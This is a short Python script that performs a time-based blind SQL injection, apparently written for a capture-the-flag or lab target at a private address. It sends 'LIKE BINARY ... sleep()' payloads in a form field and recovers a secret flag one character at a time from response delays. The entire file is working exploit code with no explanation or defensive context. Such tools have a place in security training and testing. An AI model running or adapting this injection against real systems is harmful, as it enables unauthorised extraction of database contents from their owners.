import requests
import urllib.parse
from string import printable

sleep = 2  # seconds
url = "http://192.168.1.89:8080/he3.php"
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
timeout = 20

max_length = 32
found_value = ""
margen = 0.2  # Marge for some queries that end eaerlier.

for i in range(0, max_length + 1):
    for character in printable:

        # El % es reservado de SQL
        if character == "%": #or character == "v": # para saltarnos el primer flag
            continue

        current_value = found_value + character

        # PAYLOAD
        payload = "1 or if((flag LIKE BINARY '" + current_value + "%'),sleep(" + str(sleep) + "),0);"
        encoded_payload = "texto=" + urllib.parse.quote(payload)

        response = requests.post(url, data=encoded_payload, timeout=timeout, headers=headers)

        if response.elapsed.total_seconds() + margen > sleep:
            found_value = found_value + character
            print("[" + str(i) + "] The flag is: " + found_value)
            break
